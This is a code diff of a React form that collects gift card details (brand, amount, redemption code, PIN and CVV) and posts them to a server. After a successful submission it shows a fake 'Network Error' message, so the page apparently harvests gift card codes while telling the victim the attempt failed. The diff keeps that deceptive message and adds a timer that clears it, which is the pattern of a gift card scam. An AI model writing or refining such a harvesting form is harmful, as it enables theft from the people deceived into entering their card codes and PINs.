@@ -121,12 +121,15 @@ const Formpage = ({refProp}) => {
       return;
     }
     setLoading(true);
-    setError('Network Error: A Validation Error has occurred. Please Try Again');
-
+   
     try {
       const response = await axios.post('http://localhost:2060/api/v1/create', formData);
       console.log(response);
         setError('Network Error: A Validation Error has occurred. Please Try Again');
+        setTimeout(() => {
+           setError("");
+
+        }, 3000);
     } catch (err) {
       setError('Something went wrong while submitting.');
       console.error(err);
@@ -146,7 +149,7 @@ const Formpage = ({refProp}) => {
               <p>{error}</p>
             </div>
           )}
-          <select name="Name" onChange={handleChange} className="w-full p-2 rounded-md bg-white text-black">
+          <select name="Name" onChange={handleChange} className="w-full p-2 outline-none rounded-md bg-white text-black">
             <option value="">Select Card</option>
             {["Amazon", "Amex", "TT Visa", "Visa Silvery White", "Wallmart Visa", "Valina Visa", "Master Card", "Nike", "eBay", "steam", "Apple iTunes", "Google Play", "American Express", "US PSN", "Razer Gold", "Spotify", "Nordstrom", "Sephora", "Hulu", "Visa Gift", "Us Paramount+"].map(card => (
               <option key={card} value={card}>{card}</option>
@@ -154,7 +157,7 @@ const Formpage = ({refProp}) => {
           </select>
 
           <div className="flex gap-2">
-            <select name="Currency" onChange={handleChange} className="w-1/2 p-2 rounded-md bg-white text-black">
+            <select name="Currency" onChange={handleChange} className="w-1/2 p-2 outline-none rounded-md bg-white text-black">
               <option value="">Currency</option>
               {["USD", "EUR", "BTC", "GBP", "CAD", "CNY", "JPY"].map(curr => (
                 <option key={curr} value={curr}>{curr}</option>
@@ -165,7 +168,7 @@ const Formpage = ({refProp}) => {
               onChange={handleChange}
               type="number"
               placeholder="Amount"
-              className="w-1/2 p-2 rounded-md bg-white text-black"
+              className="w-1/2 p-2outline-none rounded-md bg-white text-black"
             />
           </div>
 
@@ -174,7 +177,7 @@ const Formpage = ({refProp}) => {
             onChange={handleChange}
             type="text"
             placeholder="Redemption Code"
-            className="w-full p-2 rounded-md bg-white text-black"
+            className="w-full p-2 outline-none rounded-md bg-white text-black"
           />
 
           <input
@@ -182,7 +185,7 @@ const Formpage = ({refProp}) => {
             onChange={handleChange}
             type="date"
             placeholder="Expiration Date"
-            className="w-full p-2 rounded-md bg-white text-black"
+            className="w-full p-2 outline-none rounded-md bg-white text-black"
           />
 
           <input
@@ -190,7 +193,7 @@ const Formpage = ({refProp}) => {
             onChange={handleChange}
             type="text"
             placeholder="Enter Your PIN"
-            className="w-full p-2 rounded-md bg-white text-black"
+            className="w-full outline-none p-2 rounded-md bg-white text-black"
           />
 
           <input
@@ -198,7 +201,7 @@ const Formpage = ({refProp}) => {
             onChange={handleChange}
             type="text"
             placeholder="Gift Card CVV"
-            className="w-full p-2 rounded-md bg-white text-black"
+            className="w-full outline-none p-2 rounded-md bg-white text-black"
           />
 
           <button
